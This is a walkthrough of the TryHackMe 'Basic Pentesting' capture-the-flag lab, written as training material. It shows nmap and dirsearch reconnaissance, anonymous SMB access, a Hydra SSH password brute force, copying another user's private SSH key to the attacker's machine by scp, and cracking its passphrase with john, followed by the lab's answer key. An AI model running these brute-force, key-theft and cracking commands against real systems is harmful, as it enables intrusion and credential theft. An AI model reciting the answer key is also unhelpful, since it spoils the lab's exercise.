# Basic-Pentesting [TryHackMe Lab Walkthrough](https://tryhackme.com/r/room/basicpentestingjt)
![99c72676aab814b94e3bc350ba627b71](https://github.com/Esther7171/Basic-Pentesting/assets/122229257/dd7c7231-a61d-4b0a-ad56-02355b50aa0c)

### MY Lab IP = ```10.10.50.222```

# 1. Let Scan the IP Addr
```bash
┌──(death㉿esther)-[~/Lab-CTF/Basic-pentesting]
└─$ sudo nmap 10.10.50.222 -sV -p- -A -sS -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-04 21:36 IST
Nmap scan report for 10.10.50.222
Host is up (0.17s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.7
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5.4
OS details: Linux 5.4
Network Distance: 5 hops
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2024-04-04T12:16:59-04:00
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-04-04T16:16:59
|_  start_date: N/A
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s

TRACEROUTE (using port 23/tcp)
HOP RTT       ADDRESS
1   33.51 ms  10.17.0.1
2   ... 4
5   174.68 ms 10.10.50.222

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 621.94 seconds
                                                               
```
#### As we look at nmap result the SSH is open but we dont have any kind of credentials and a good part is SMB is also present but 1st.... 
# 2. Http is open so let make a directory search to gather more info

## Im using Dirsearch bez it more easy to use.
``` sudo apt install dirsearch -y```
```bash
┌──(death㉿esther)-[~/Lab-CTF/Basic-pentesting]
└─$ dirsearch -u 10.10.50.222
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11460

Output File: /home/death/Lab-CTF/Basic-pentesting/reports/_10.10.50.222/_24-04-04_20-30-34.txt

Target: http://10.10.50.222/

[20:30:34] Starting: 
[20:30:43] 403 -  298B  - /.ht_wsr.txt
[20:30:43] 403 -  301B  - /.htaccess.save
[20:30:43] 403 -  303B  - /.htaccess.sample
[20:30:43] 403 -  301B  - /.htaccess.bak1
[20:30:43] 403 -  301B  - /.htaccess.orig
[20:30:43] 403 -  302B  - /.htaccess_extra
[20:30:43] 403 -  300B  - /.htaccessOLD2
[20:30:43] 403 -  299B  - /.htaccessBAK
[20:30:43] 403 -  299B  - /.htaccess_sc
[20:30:43] 403 -  301B  - /.htaccess_orig
[20:30:43] 403 -  299B  - /.htaccessOLD
[20:30:43] 403 -  291B  - /.htm
[20:30:43] 403 -  292B  - /.html
[20:30:43] 403 -  301B  - /.htpasswd_test
[20:30:43] 403 -  297B  - /.htpasswds
[20:30:43] 403 -  298B  - /.httr-oauth
[20:31:23] 200 -  475B  - /development/                 -------------> this is with 200 code only
[20:31:57] 403 -  300B  - /server-status
[20:31:57] 403 -  301B  - /server-status/

Task Completed
```
# 3. Let visite the directory ```10.10.50.222/development/```
### Let manually check each...
![Screenshot from 2024-04-04 21-10-45](https://github.com/Esther7171/Basic-Pentesting/assets/122229257/0728ce68-0ea0-4eb0-8dbf-3d3a8c9e2a78)

### as i open first dev.txt 

![Screenshot from 2024-04-04 21-15-38](https://github.com/Esther7171/Basic-Pentesting/assets/122229257/b056a510-0c78-4c26-860b-4a3815e00f02)

#### The message -k passing to -j about config of SMB and Apache maybe k and j are user. let open another.
![Screenshot from 2024-04-04 21-18-10](https://github.com/Esther7171/Basic-Pentesting/assets/122229257/95e3c763-4253-4452-967d-75e0525a71e4)
### Again k passing message to J about /etc/shadow have weak credentials and they are easily crackable hashes.

# 4. Checking SMB to get Some credentials
```sudo apt install smbclient -y``` ```[ -L ] option use below is for mapping```
```bash
┌──(death㉿esther)-[~/Lab-CTF/Basic-pentesting]
└─$ smbclient -L 10.10.50.222
Password for [WORKGROUP\death]:

	Sharename       Type      Comment
	---------       ----      -------
	Anonymous       Disk      
	IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            BASIC2
```
# 5. Let Check Anonymous folder
```bash
┌──(death㉿esther)-[~/Lab-CTF/Basic-pentesting]
└─$ smbclient //10.10.50.222/Anonymous
Password for [WORKGROUP\death]:
Try "help" to get a list of possible commands.
smb: \> 
```
### So there is no passowrd on SMB let check.
```bash
┌──(death㉿esther)-[~/Lab-CTF/Basic-pentesting]
└─$ smbclient //10.10.50.222/Anonymous
Password for [WORKGROUP\death]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 19 23:01:20 2018
  ..                                  D        0  Thu Apr 19 22:43:06 2018
  staff.txt                           N      173  Thu Apr 19 22:59:55 2018

		14318640 blocks of size 1024. 11087940 blocks available
smb: \> 
```
### So there is a text file "staff.txt" so download it on our system
```get command use to download file```
```bash
┌──(death㉿esther)-[~/Lab-CTF/Basic-pentesting]
└─$ smbclient //10.10.50.222/Anonymous
Password for [WORKGROUP\death]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 19 23:01:20 2018
  ..                                  D        0  Thu Apr 19 22:43:06 2018
  staff.txt                           N      173  Thu Apr 19 22:59:55 2018

		14318640 blocks of size 1024. 11087940 blocks available
smb: \> get staff.txt
getting file \staff.txt of size 173 as staff.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> 
```
## Let read the txt file we got from smb
```bash
┌──(death㉿esther)-[~/Lab-CTF/Basic-pentesting]
└─$ cat staff.txt      
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
```
### So ```kay``` and ```Jan``` are two user and ```jan``` system password are week 
# 6. Let brute-force SSH service
### As we know ip and username let brute it.
``` sudo apt install hydra -y ```
```bash
┌──(death㉿esther)-[~/Lab-CTF/Basic-pentesting]
└─$ hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.50.222 -t 50
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-04 22:19:07
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 50 tasks per 1 server, overall 50 tasks, 14344399 login tries (l:1/p:14344399), ~286888 tries per task
[DATA] attacking ssh://10.10.50.222:22/
[STATUS] 390.00 tries/min, 390 tries in 00:01h, 14344028 to do in 612:60h, 31 active
[STATUS] 229.67 tries/min, 689 tries in 00:03h, 14343733 to do in 1040:55h, 27 active
[22][ssh] host: 10.10.50.222   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 23 final worker threads did not complete until end.
[ERROR] 23 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-04-04 22:22:17
```
#### I got password ```armando```, So there is no firewall to block me doing bruteforce im sending 50 threads at once to fast this process
#### For verbose mode use ```-V``` i dont use in at time of making walkthrough it make terminal more messed up
# 7. Let login at Jan account
```bash
┌──(death㉿esther)-[~/Lab-CTF/Basic-pentesting]
└─$ ssh jan@10.10.50.222
The authenticity of host '10.10.50.222 (10.10.50.222)' can't be established.
ED25519 key fingerprint is SHA256:XKjDkLKocbzjCch0Tpriw1PeLPuzDufTGZa4xMDA+o4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.50.222' (ED25519) to the list of known hosts.
jan@10.10.50.222's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Mon Apr 23 15:55:45 2018 from 192.168.56.102
jan@basic2:~$ 
```
### Simply list storage
```bash
jan@basic2:~$ ls -la
total 12
drwxr-xr-x 2 root root 4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 root jan    47 Apr 23  2018 .lesshst
```
### It totally empty let check if there any other user exist
```bash
jan@basic2:~$ cd /home
jan@basic2:/home$ ls
jan  kay
jan@basic2:/home$ 
```
### Ok let go to kay
```bash
jan@basic2:/home$ cd kay
jan@basic2:/home/kay$ ls -la
total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 kay  kay   756 Apr 23  2018 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo
jan@basic2:/home/kay$ 

```
### I got a passowrd backup file ```pass.bak``` but i dont have permision to it.
## Let Check SSH 
```bash
jan@basic2:/home/kay$ cd .ssh
jan@basic2:/home/kay/.ssh$ ls -la
total 20
drwxr-xr-x 2 kay kay 4096 Apr 23  2018 .
drwxr-xr-x 5 kay kay 4096 Apr 23  2018 ..
-rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys
-rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa
-rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub
jan@basic2:/home/kay/.ssh$ 
```

# 8. Transfering rsa key to our System using ```Scp``` 
```sudo apt install openssh-client```
```bash
┌──(death㉿esther)-[~/Lab-CTF/Basic-pentesting]
└─$ sudo service ssh start   
[sudo] password for death: 
                                                                                                                                                                                                                                              
┌──(death㉿esther)-[~/Lab-CTF/Basic-pentesting]
└─$ ifconfig                                    
lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 176  bytes 14224 (13.8 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 176  bytes 14224 (13.8 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.17.120.99  netmask 255.255.128.0  destination 10.17.120.99
        inet6 fe80::94b7:64a1:2c1e:82c6  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 144120  bytes 26102469 (24.8 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 158204  bytes 21129588 (20.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

                                                                                                                                                                                                                                              
┌──(death㉿esther)-[~/Lab-CTF/Basic-pentesting]
└─$ pwd              
/home/death/Lab-CTF/Basic-pentesting
                                                                                                                                                                                                                                              
┌──(death㉿esther)-[~/Lab-CTF/Basic-pentesting]

```
## I want this rsa at this location ```/home/death/Lab-CTF/Basic-pentesting```, and copy ur vpn ip mine is ```10.17.120.99``` 
### In Kay ,Let transfer it.
```bash
jan@basic2:/home/kay/.ssh$ scp id_rsa death@10.17.120.99:/home/death/Lab-CTF/Basic-pentesting/
Could not create directory '/home/jan/.ssh'.
The authenticity of host '10.17.120.99 (10.17.120.99)' can't be established.
ECDSA key fingerprint is SHA256:/buBatPVxdzFYyMDbKFqcBZbNSdBI/cZQ7WxNYDuVLE.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/jan/.ssh/known_hosts).
death@10.17.120.99's password: 
id_rsa                                                                                                                                                                                                      100% 3326     3.3KB/s   00:00    
jan@basic2:/home/kay/.ssh$ 
```
# 9. Let Crack using john
```sudo apt install john -y```
### Change it to john readable formate
```bash
┌──(death㉿esther)-[~/Lab-CTF/Basic-pentesting]
└─$ ssh2john id_rsa > rsa
```
### Now brute force it
```bash
┌──(death㉿esther)-[~/Lab-CTF/Basic-pentesting]
└─$ john rsa -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (id_rsa)     
1g 0:00:00:00 DONE (2024-04-04 23:08) 12.50g/s 1035Kp/s 1035Kc/s 1035KC/s bird..aries13
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
### I got the password ```beeswax``` 
### let change permision of id_rsa to use
```bash
┌──(death㉿esther)-[~/Lab-CTF/Basic-pentesting]
└─$ chmod 600 id_rsa
```
# 10. Gaining access to kay
```bash
┌──(death㉿esther)-[~/Lab-CTF/Basic-pentesting]
└─$ ssh kay@10.10.50.222 -i id_rsa 
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Mon Apr 23 16:04:07 2018 from 192.168.56.102
kay@basic2:~$ 
```
### I got this
```bash
kay@basic2:~$ cat pass.bak 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

# Done

## Let answer the lab asked question

### QUES 1. --
### QUES 2. --
### QUES 3. What is the name of the hidden directory on the web server(enter name without /)?
```bash
Development
````
### QUES 4. --
### QUES 5. What is the username
```bash
jan
```
### QUES 6. What is the password?
```bash
Armando
```
### QUES 7. What service do you use to access the server(answer in abbreviation in all caps)?
```bash
ssh
```
### QUES 8. --
### QUES 9. What is the name of the other user you found(all lower case)?
```bash
kay
```
### QUES 10. --
### QUES 11. What is the final password you obtain?
```bash
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```


# 🙂
